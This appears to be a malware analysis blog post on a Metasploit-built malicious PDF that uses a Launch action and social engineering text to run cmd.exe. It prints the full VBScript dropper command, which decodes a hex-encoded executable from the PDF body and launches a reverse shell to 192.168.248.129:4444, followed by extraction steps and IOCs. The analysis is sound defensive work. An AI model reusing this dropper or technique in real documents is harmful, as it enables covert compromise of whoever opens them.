---
title: "Metasploit: adobe_pdf_embedded_exe_nojs"
date: 2025-11-22
draft: false
summary: "A malicious PDF uses a Launch action to execute cmd.exe, which runs an inline VBScript that reads hex-encoded shellcode directly from the PDF body, writes it to disk as an executable, and launches a Metasploit reverse shell."
tags:
  - Malware Analysis
  - Windows
  - PDF
  - PE
  - VBScript
  - pdfid
  - pdf-parser
  - Sandbox
platform: Malware Analysis
---

### <span style="color:lightblue">TL;DR</span>
A malicious PDF contains no JavaScript or embedded file objects — instead, a `Launch` action executes `cmd.exe` with an inline VBScript command that reads hex-encoded bytes directly from the PDF body, decodes them into a PE32 executable, and runs it. The payload establishes a Metasploit reverse shell to `192.168.248.129:4444`.

### <span style="color:red">Initial Analysis</span>
```console
$ file *
evil.pdf: PDF document, version 1.5
```

### <span style="color:red">Static Analysis</span>
`pdfid` showed no JavaScript but confirmed `/OpenAction` and `/Launch`:
```console
$ pdfid evil.pdf
PDFiD 0.2.10 evil.pdf
 /JS                    0
 /JavaScript            0
 /OpenAction            1(1)
 /Launch                1(1)
 /EmbeddedFile          0
```

Unlike the previous sample, there is no JavaScript and no embedded file object — the payload is hidden in plain sight inside the PDF body itself.

`pdf-parser` revealed the `Launch` action in obj 5:
```console
$ pdf-parser evil.pdf
obj 5 0
 Type: /Action
 /S /Launch
 /F (cmd.exe)
 /P (/C echo Set o=CreateObject^("Scripting.FileSystemObject"^):
     Set f=o.OpenTextFile^("evil.pdf",1,True^):
     f.SkipLine:
     Set w=CreateObject^("WScript.Shell"^):
     Set g=o.OpenTextFile^(w.ExpandEnvironmentStrings^("%TEMP%"^)+"\\msf.exe",2,True^):
     a=Split^(Trim^(Replace^(f.ReadLine,"\\x"," "^)^)^):
     for each x in a:g.Write^(Chr^("&h" ^& x^)^):next:
     g.Close:f.Close > 1.vbs && cscript //B 1.vbs &&
     start %TEMP%\\msf.exe && del /F 1.vbs)
```

The command does the following:
1. Writes an inline VBScript to `1.vbs`
2. The VBScript opens `evil.pdf` itself, skips the first line (PDF header), and reads the second line which contains hex-encoded bytes in `\xNN` format
3. Decodes each hex byte using `Chr("&h" & x)` and writes the result to `%TEMP%\msf.exe`
4. Executes `msf.exe` and deletes `1.vbs`

The social engineering message `"To view the encrypted content please tick the Do not show this message again box and press Open"` is appended to trick the user into clicking Open, which triggers the `Launch` action.

Inspecting the PDF body confirmed the hex-encoded payload on the second line:
```console
$ cat evil.pdf
%PDF-1.5
\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00...
```

`\x4d\x5a` = `MZ` — PE32 magic bytes, confirming an executable is embedded directly in the PDF body.

The payload was extracted with:
```console
$ grep -oP '\\x\K[0-9a-fA-F]{2}' evil.pdf | xxd -r -p > mw.bin

$ file mw.bin
mw.bin: PE32 executable for MS Windows 4.00 (GUI), Intel i386, 5 sections
```

### <span style="color:red">Dynamic Analysis</span>
The extracted PE was executed in a sandbox. It established a connection to `192.168.248.129` over port `4444` — a default Metasploit reverse shell port.

![Sandbox network connections](image.png)


### <span style="color:lightblue">IOCs</span>

**Files**  
\- `evil.pdf` — malicious PDF, payload carrier  
\- `%TEMP%\msf.exe` — decoded PE32 reverse shell  
\- `1.vbs` — temporary VBScript dropper (self-deleted)  

**Network**  
\- C2 Server: `192.168.248.129`  
\- C2 Port: `4444/tcp`